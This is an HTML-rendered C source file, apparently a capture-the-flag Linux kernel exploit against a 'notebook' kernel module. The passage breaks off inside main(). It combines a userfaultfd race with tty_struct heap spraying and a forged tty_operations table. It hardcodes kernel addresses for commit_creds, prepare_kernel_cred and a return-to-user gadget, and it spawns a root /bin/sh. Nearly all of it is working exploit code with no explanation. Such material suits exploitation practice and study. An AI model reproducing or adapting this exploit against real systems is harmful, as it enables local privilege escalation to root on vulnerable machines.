<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">                                  <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">                  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                  <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                         <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                      <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">	<span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">	<span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_CODE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GIFT_CODE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_CODE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_CODE 768</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ptm_unix98_ops 0xFFFFFFFF81E8E440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pty_unix98_ops 0xFFFFFFFF81E8E320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_BASE 0xFFFFFFFF810A9B40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_BASE 0xFFFFFFFF810A9EF0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kernel_BASE 0xFFFFFFFF81000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81A00929</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> add_thread, edit_thread;</span><br><span class="line"><span class="type">char</span>* mmap_space;</span><br><span class="line"><span class="type">sem_t</span> add_sem, edit_sem;</span><br><span class="line"><span class="type">int</span> ptmx_fds[<span class="number">0x60</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">notearg</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;notearg;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* note;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;note;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>;</span><br><span class="line">note* <span class="title function_">notebook_msg</span><span class="params">(<span class="type">bool</span> printInfo)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteedit_exp</span><span class="params">(<span class="type">void</span>* args)</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteadd_exp</span><span class="params">(<span class="type">void</span>* args)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span>* msg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdd note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= <span class="number">0x60</span>)</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m&quot;</span>);</span><br><span class="line">        arg.size = <span class="number">0x60</span>;</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">        arg.size = size;</span><br><span class="line">        noteedit(idx, size, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mFetch note information...\n\033[m&quot;</span>);</span><br><span class="line">    notearg arg = &#123;<span class="number">0</span>, <span class="number">0</span>, buf&#125;;</span><br><span class="line">    ioctl(fd, GIFT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mDelete note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, <span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    ioctl(fd, DELETE_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mResize note #%zu to %zu...\n\033[m&quot;</span>, idx, size);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    ioctl(fd, EDIT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mWrite to note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    write(fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line">note* <span class="title function_">notebook_msg</span><span class="params">(<span class="type">bool</span> printInfo)</span>&#123;</span><br><span class="line">    note* noteBuf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(note) * <span class="number">0x10</span>);</span><br><span class="line">    notegift(noteBuf);</span><br><span class="line">    <span class="keyword">if</span>(printInfo)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;36m--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Current Notebook Info:\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\tNote #%02d: size = %#zx, pointer = %p\n&quot;</span>, i, noteBuf[i].size, noteBuf[i].note);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n\033[m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> noteBuf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteedit_exp</span><span class="params">(<span class="type">void</span>* args)</span>&#123;</span><br><span class="line">    noteedit((<span class="type">int</span>)args, <span class="number">0x2000</span>, mmap_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteadd_exp</span><span class="params">(<span class="type">void</span>* args)</span>&#123;</span><br><span class="line">    noteadd((<span class="type">int</span>)args, <span class="number">0x50</span>, mmap_space);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span>	<span class="comment">// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = (<span class="type">int</span>)uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully entered registered userfaultfd!\n\033[m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">50</span>);      <span class="comment">// stop here</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read((<span class="type">int</span>)uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get root privilege&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully get root shell!\n\033[m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    page = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span 